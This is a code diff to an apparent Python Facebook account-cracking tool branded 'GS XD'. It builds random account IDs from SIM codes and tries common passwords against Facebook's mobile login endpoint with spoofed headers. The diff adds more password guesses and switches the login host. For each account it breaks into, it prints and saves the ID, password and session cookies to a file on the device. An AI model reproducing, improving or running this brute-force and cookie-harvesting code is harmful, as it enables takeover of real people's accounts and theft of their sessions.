@@ -237,7 +237,7 @@ def i():
     print("")
     os.system('clear')
     print(logo)
-    print("           \033[1;97m[\033[1;33mGS-XD\--👽--/\033[1;97m]")
+    print("           \033[1;97m[\033[1;33m	\--👽--/\033[1;97m]")
     print("\033[38;5;46--------------------------------------------")
     print("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[1;35m10000\033[1;97m , \033[1;34m20000\033[1;97m , \033[1;32m30000")
     print("\033[38;5;46--------------------------------------------")
@@ -253,10 +253,10 @@ def i():
         jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m: \033[1;32m'+code)
         jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mCRACK ID  \033[38;5;196m: \033[1;32m'+tl)
         print('\033[38;5;46--------------------------------------------')
-        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m┇ \033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m ┇\033[1;97mAIRPLANE MODE")
+        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m┇ \033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m ┇ \033[1;97mAIRPLANE MODE")
         print('\033[38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'203040','708090','0987654']
+            pwx = [love,kode+love,'+88','203040','708090','0987654']
             uid = code+love
             Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
@@ -296,13 +296,12 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print('\033[38;5;46m┃GS XD-OK┃✔┃ ' +uid+ '|' +ps+    '  \n   \033┃COOKIES┃🍪┃ : \033[38;5;46m'+coki+ ' ')  
-                follow(self,coki)
                 cek_apk(session,coki)
                 open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
